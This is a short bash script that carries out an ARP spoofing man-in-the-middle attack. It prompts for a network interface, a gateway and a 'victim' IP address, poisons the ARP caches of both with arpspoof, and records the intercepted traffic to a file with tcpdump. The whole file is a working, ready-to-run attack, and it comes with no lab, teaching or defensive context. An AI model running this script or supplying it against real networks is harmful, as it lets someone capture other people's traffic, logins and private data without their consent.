#!/bin/bash
echo "========== LISTING AVAILABLE NETWORK INTERFACES ==========="
ip addr
echo "enter interface: "
read interface
echo "========== LISTING ARP TABLE ============"
arp -a
echo "enter gateway IP address: "
read gateway
echo "enter victim IP address: "
read victim
echo "========== SPOOFING ROUTER WITH TARGET =========="
echo "[i] CAPTURED DATA WILL BE SAVED IN 'capture_data' FILE"
arpspoof -i $interface -t $gateway $victim &
arpspoof -i $interface -t $victim $gateway &
tcpdump -i $interface > capture_data
# killall arpspoof